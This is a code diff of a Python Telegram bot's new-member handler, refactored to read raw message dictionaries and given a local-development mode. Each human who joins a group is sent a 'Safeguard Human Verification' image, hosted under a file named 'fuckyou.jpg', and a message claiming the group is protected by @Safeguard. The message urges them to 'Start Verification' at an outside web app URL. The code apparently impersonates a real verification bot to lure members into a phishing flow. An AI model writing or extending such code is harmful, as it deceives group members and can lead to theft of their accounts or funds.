@@ -170,55 +170,73 @@ class HTTPTelegramBot:
             reply_markup=keyboard
         )
 
-    async def handle_new_member(self, update):
+    def handle_new_member(self, message):
         """Handle when new users join a group"""
-        chat = update.effective_chat
-        logger.info(f"🆕 New member event detected in chat: {chat.id} ({chat.title})")
-        new_members = update.message.new_chat_members
-        logger.info(f"👥 New members: {[f'{m.first_name} (ID: {m.id}, Bot: {m.is_bot})' for m in new_members]}")
+        chat = message.get('chat', {})
+        new_members = message.get('new_chat_members', [])
+        
+        logger.info(f"🆕 New member event detected in chat: {chat.get('id')} ({chat.get('title')})")
+        logger.info(f"👥 New members: {[f'{m.get('first_name', 'Unknown')} (ID: {m.get('id')}, Bot: {m.get('is_bot', False)})' for m in new_members]}")
+        
         for new_member in new_members:
-            if not new_member.is_bot:
-                logger.info(f"👤 Processing new human member: {new_member.first_name} (ID: {new_member.id})")
-                logger.info(f"📝 Message ID: {update.message.message_id}")
-                logger.info(f"📝 Chat Type: {chat.type}")
-                logger.info(f"📝 Chat Title: {chat.title}")
+            if not new_member.get('is_bot', False):
+                logger.info(f"👤 Processing new human member: {new_member.get('first_name')} (ID: {new_member.get('id')})")
+                
+                # Add more detailed logging
+                logger.info(f"📝 Message ID: {message.get('message_id')}")
+                logger.info(f"📝 Chat Type: {chat.get('type')}")
+                logger.info(f"📝 Chat Title: {chat.get('title')}")
+                
                 # 1. Send the Safeguard Human Verification image
                 try:
                     photo_url = "https://i.ibb.co/CKY1GCHq/fuckyou.jpg"
-                    self.send_photo(
-                        chat_id=chat['id'],
-                        photo_url=photo_url
-                    )
-                        
+                    photo_result = self.send_photo(chat_id=chat['id'], photo_url=photo_url)
+                    if photo_result:
+                        logger.info(f"✅ Verification image sent for new member {new_member.get('id')}")
+                    else:
+                        logger.error(f"❌ Failed to send verification image")
                 except Exception as e:
-                    logger.error(f"❌ Failed to send verification image: {e}")
+                    logger.error(f"❌ Error sending verification image: {e}")
+                
                 # 2. Send the styled welcome message
                 welcome_text = (
                     'This group is being protected by '
                     '<a href="https://t.me/safeguard_bot">@Safeguard</a>.'
                     '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
                 ).format(webapp_url=WEBAPP_URL)
-                keyboard = {
-                    "inline_keyboard": [[
-                        {
-                            "text": "🔐 Start Verification",
-                            "url": WEBAPP_URL
-                        }
-                    ]]
-                }
-                reply_markup = keyboard
+                
+                # For local development, don't use inline keyboard (Telegram requires HTTPS)
+                if LOCAL_DEV:
+                    # Send message without inline keyboard for local testing
+                    welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
+                    keyboard = None
+                else:
+                    keyboard = {
+                        "inline_keyboard": [[
+                            {
+                                "text": "🔐 Start Verification",
+                                "url": WEBAPP_URL
+                            }
+                        ]]
+                    }
+                
                 try:
-                    self.send_message(
+                    result = self.send_message(
                         chat_id=chat['id'],
                         text=welcome_text,
-                        reply_markup=reply_markup,
                         parse_mode='HTML',
+                        reply_markup=keyboard
                     )
-                    logger.info(f"✅ Welcome message sent for new member {new_member.id} in chat {chat.id}")
+                    
+                    if result:
+                        logger.info(f"✅ Welcome message sent for new member {new_member.get('id')} in chat {chat.get('id')}")
+                    else:
+                        logger.error(f"❌ Failed to send welcome message")
+                        
                 except Exception as e:
-                    logger.error(f"❌ Failed to send welcome message: {e}")
+                    logger.error(f"❌ Error sending welcome message: {e}")
             else:
-                logger.info(f"🤖 Skipping bot member: {new_member.first_name}")
+                logger.info(f"🤖 Skipping bot member: {new_member.get('first_name')}")
 
 
     def handle_message(self, message):
